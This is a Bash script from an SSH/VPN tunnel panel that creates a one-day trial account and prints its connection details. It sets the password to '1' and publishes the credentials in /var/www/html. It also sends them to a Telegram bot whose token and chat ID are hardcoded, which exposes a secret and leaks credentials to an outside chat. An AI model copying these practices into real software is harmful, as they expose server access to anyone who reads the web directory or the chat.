#!/bin/bash
MYIP=$(wget -qO- ipinfo.io/ip);
BIBlack='\033[1;90m'      # Black
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIYellow='\033[1;93m'     # Yellow
BIBlue='\033[1;94m'       # Blue
BIPurple='\033[1;95m'     # Purple
BICyan='\033[1;96m'       # Cyan
BIWhite='\033[1;97m'      # White
UWhite='\033[4;37m'       # White
On_IPurple='\033[0;105m'  #
On_IRed='\033[0;101m'
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White
NC='\e[0m'
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
# // Exporting Language to UTF-8

export LANG='en_US.UTF-8'
export LANGUAGE='en_US.UTF-8'


# // Export Color & Information
export RED='\033[0;31m'
export GREEN='\033[0;32m'
export YELLOW='\033[0;33m'
export BLUE='\033[0;34m'
export PURPLE='\033[0;35m'
export CYAN='\033[0;36m'
export LIGHT='\033[0;37m'
export NC='\033[0m'


dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
#########################
# Getting
clear
CHATID="6582195916"
KEY="6621929387:AAG-7u9w7NTV2M0REX2oISWHdtgMdNZUQRc"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TIMES="10"
clear
sldomain=$(cat /root/nsdomain)
cdndomain=$(cat /etc/domain/cf-domain)
domain=$(cat /etc/xray/domain)
slkey=$(cat /etc/slowdns/server.pub)
flare=$(cat /etc/xray/flare-domain)
clear

clear
IP=$(curl -sS ifconfig.me);
Login=trial`</dev/urandom tr -dc X-Z0-9 | head -c4`
hari="1"
Pass=1
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "                   ${BIWhite}${UWhite}SSH TRIAL ACCOUNT ${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "   Generat user for 1 day ....."
sleep 3
clear
useradd -e `date -d "$masaaktif days" +"%Y-%m-%d"` -s /bin/false -M $Login
exp="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
echo -e "$Pass\n$Pass\n"|passwd $Login &> /dev/null
mkdir /etc/accssh > /dev/null 2>&1

function ssh() {
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "                ${BIWhite}${UWhite}𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}Username    :${NC} ${BIGreen}$Login${NC}"
echo -e "   ${BIWhite}Password    :${NC} ${BIGreen}$Pass${NC}"
echo -e "   ${BIWhite}Expired On  :${NC} ${BIYellow}$exp${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "                ${BIWhite}${UWhite}𝗦𝗘𝗥𝗩𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}IP          :${NC} ${BIGreen}$IP${NC}"
echo -e "   ${BIWhite}Host        :${NC} ${BIGreen}$domain${NC}"
echo -e "   ${BIWhite}Cloudflare  :${NC} ${BIGreen}$flare${NC}"
echo -e "   ${BIWhite}Nameserver  :${NC} ${BIGreen}$sldomain${NC}"
echo -e "   ${BIWhite}PubKey      :${NC} ${BIGreen}$slkey${NC}"
echo -e "   ${BIWhite}OpenSSH     :${NC} ${BIPurple}22${NC}"
echo -e "   ${BIWhite}SSH-WS      :${NC} ${BIPurple}80${NC}"
echo -e "   ${BIWhite}SSH-SSL-WS  :${NC} ${BIPurple}443${NC}"
echo -e "   ${BIWhite}SSL/TLS     :${NC} ${BIPurple}447 , 777${NC}"
echo -e "   ${BIWhite}SlowDNS     :${NC} ${BIPurple}53,5300,443${NC}" 
echo -e "   ${BIWhite}UDP Custom  :${NC} ${BIPurple}1-65535${NC}" 
echo -e "   ${BIWhite}UDPGW       :${NC} ${BIPurple}7100-7900${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}SSH WS      :${NC} ${BIGreen}$domain:80@$Login:$Pass${NC}"
echo -e "   ${BIWhite}SSH WSS     :${NC} ${BIGreen}$domain:443@$Login:$Pass${NC}"
echo -e "   ${BIWhite}SSH UDP     :${NC} ${BIGreen}$domain:1-65535@$Login:$Pass${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}Account Info   :${NC} ${BIGreen}http://$IP:81/$Login.txt${NC}"
echo -e "   ${BIWhite}OpenVPN Config :${NC} ${BIGreen}http://$IP:81/${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}Payload WS/WSS${NC}"
echo -e "  ${BIPurple}GET / HTTP/1.1[crlf]Host: $domain[crlf]Connection:
  Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf]
  Expect: 100-continue[crlf][crlf]${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
rm /etc/accssh/$Login.txt > /dev/null 2>&1
echo "=============================================
             ACCOUNT INFORMATION
=============================================
Username    : $Login
Password    : $Pass
Expired On  : $exp
=============================================
             SERVER INFORMATION
=============================================
IP          : $IP
Host        : $domain
Cloudflare  : $flare
Nameserver  : $sldomain
PubKey      : $slkey
OpenSSH     : 22
SSH-WS      : 80
SSH-SSL-WS  : 443
SSL/TLS     : 447 , 777
SlowDNS     : 53,5300,443 
UDP Custom  : 1-65535 
UDPGW       : 7100-7900
=============================================
SSH WS      : $domain:80@$Login:$Pass
SSH WSS     : $domain:443@$Login:$Pass
SSH UDP     : $domain:1-65535@$Login:$Pass
=============================================
OpenVPN Config : 
http://$IP:81/
=============================================
Payload WS/WSS
GET / HTTP/1.1[crlf]Host: $domain[crlf]Connection: Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf]Expect: 100-continue[crlf][crlf]
=============================================" >> /etc/accssh/$Login.txt
cp /etc/accssh/$Login.txt -t /var/www/html
TEXT="━━━━━━━━━━━━━━━━━━━━━━━━━━━
               <strong>ACCOUNT INFORMATION</strong>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>Username    :</strong> <code>$Login</code>
<strong>Password    :</strong> <code>$Pass</code>
<strong>Expired On  :</strong> <code>$exp</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
               <strong>SERVER INFORMATION</strong>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>IP          :</strong> <code>$IP</code>
<strong>Host        :</strong> <code>$domain</code>
<strong>Cloudflare  :</strong> <code>$flare</code>
<strong>Nameserver  :</strong> <code>$sldomain</code>
<strong>PubKey      :</strong> <code>$slkey</code>
<strong>OpenSSH     :</strong> <code>22</code>
<strong>SSH-WS      :</strong> <code>80</code>
<strong>SSH-SSL-WS  :</strong> <code>443</code>
<strong>SSL/TLS     :</strong> <code>447</code> , <code>777</code>
<strong>SlowDNS     :</strong> <code>53</code>,<code>5300</code>,<code>443</code>
<strong>UDP Custom  :</strong> <code>1-65535</code>
<strong>UDPGW       :</strong> <code>7100-7900</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>SSH WS      :</strong> <code>$domain:80@$Login:$Pass</code>
<strong>SSH WSS     :</strong> <code>$domain:443@$Login:$Pass</code>
<strong>SSH UDP     :</strong> <code>$domain:1-65535@$Login:$Pass</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>Account Info   :</strong> http://$IP:81/$Login.txt
<strong>OpenVPN Config :</strong> 
http://$IP:81/
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>Payload WS/WSS</strong>
<code>GET / HTTP/1.1[crlf]Host: $domain[crlf]Connection: Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf]Expect: 100-continue[crlf][crlf]</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━"
curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL > /dev/null 2>&1
}

function ovpn() {
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "                ${BIWhite}${UWhite}𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}Username    :${NC} ${BIGreen}$Login${NC}"
echo -e "   ${BIWhite}Password    :${NC} ${BIGreen}$Pass${NC}"
echo -e "   ${BIWhite}Expired On  :${NC} ${BIYellow}$exp${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "                ${BIWhite}${UWhite}𝗦𝗘𝗥𝗩𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}IP          :${NC} ${BIGreen}$IP${NC}"
echo -e "   ${BIWhite}Host        :${NC} ${BIGreen}$domain${NC}"
echo -e "   ${BIWhite}Cloudflare  :${NC} ${BIGreen}$flare${NC}"
echo -e "   ${BIWhite}Nameserver  :${NC} ${BIGreen}$sldomain${NC}"
echo -e "   ${BIWhite}PubKey      :${NC} ${BIGreen}$slkey${NC}"
echo -e "   ${BIWhite}OpenSSH     :${NC} ${BIPurple}22${NC}"
echo -e "   ${BIWhite}OVPN-WS     :${NC} ${BIPurple}80${NC}"
echo -e "   ${BIWhite}SSL/TLS     :${NC} ${BIPurple}442${NC}"
echo -e "   ${BIWhite}SlowDNS     :${NC} ${BIPurple}53,5300,443${NC}" 
echo -e "   ${BIWhite}UDP Custom  :${NC} ${BIPurple}1-65535${NC}" 
echo -e "   ${BIWhite}UDPGW       :${NC} ${BIPurple}7100-7900${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}SSH UDP     :${NC} ${BIGreen}$domain:1-65535@$Login:$Pass${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}Account Info   :${NC} ${BIGreen}http://$IP:81/$Login.txt${NC}"
echo -e "   ${BIWhite}OpenVPN Config :${NC} ${BIGreen}http://$IP:81/${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
echo -e "${BICyan} ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "   ${BIWhite}Payload WS${NC}"
echo -e "  ${BIPurple}GET / HTTP/1.1[crlf]Host: $domain[crlf]Connection:
  Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf]
  Expect: 100-continue[crlf][crlf]${NC}"
echo -e " ${BICyan}└─────────────────────────────────────────────────────┘${NC}"
rm /etc/accssh/$Login.txt > /dev/null 2>&1
echo "=============================================
             ACCOUNT INFORMATION
=============================================
Username    : $Login
Password    : $Pass
Expired On  : $exp
=============================================
             SERVER INFORMATION
=============================================
IP          : $IP
Host        : $domain
Cloudflare  : $flare
Nameserver  : $sldomain
PubKey      : $slkey
OpenSSH     : 22
OVPN-WS     : 80
SSL/TLS     : 442
SlowDNS     : 53,5300,443 
UDP Custom  : 1-65535 
UDPGW       : 7100-7900
=============================================
SSH UDP     : $domain:1-65535@$Login:$Pass
=============================================
OpenVPN Config : 
http://$IP:81/
=============================================
Payload WS
GET / HTTP/1.1[crlf]Host: $domain[crlf]Connection: Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf]Expect: 100-continue[crlf][crlf]
=============================================" >> /etc/accssh/$Login.txt
cp /etc/accssh/$Login.txt -t /var/www/html
TEXT="━━━━━━━━━━━━━━━━━━━━━━━━━━━
               <strong>ACCOUNT INFORMATION</strong>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>Username    :</strong> <code>$Login</code>
<strong>Password    :</strong> <code>$Pass</code>
<strong>Expired On  :</strong> <code>$exp</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
               <strong>SERVER INFORMATION</strong>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>IP          :</strong> <code>$IP</code>
<strong>Host        :</strong> <code>$domain</code>
<strong>Cloudflare  :</strong> <code>$flare</code>
<strong>Nameserver  :</strong> <code>$sldomain</code>
<strong>PubKey      :</strong> <code>$slkey</code>
<strong>OpenSSH     :</strong> <code>22</code>
<strong>OVPN-WS     :</strong> <code>80</code>
<strong>SSL/TLS     :</strong> <code>442</code>
<strong>SlowDNS     :</strong> <code>53</code>,<code>5300</code>,<code>443</code>
<strong>UDP Custom  :</strong> <code>1-65535</code>
<strong>UDPGW       :</strong> <code>7100-7900</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>SSH UDP     :</strong> <code>$domain:1-65535@$Login:$Pass</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>Account Info   :</strong> http://$IP:81/$Login.txt
<strong>OpenVPN Config :</strong> 
http://$IP:81/
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<strong>Payload WS/WSS</strong>
<code>GET / HTTP/1.1[crlf]Host: $domain[crlf]Connection: Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf]Expect: 100-continue[crlf][crlf]</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━"
curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL > /dev/null 2>&1
}
if grep -q "SSH" /etc/ws/status2; then
ssh
fi

if grep -q "OVPN" /etc/ws/status2; then
ovpn
fi

read -n 1 -s -r -p "    Press any key to back on menu"
clear
menu-ssh
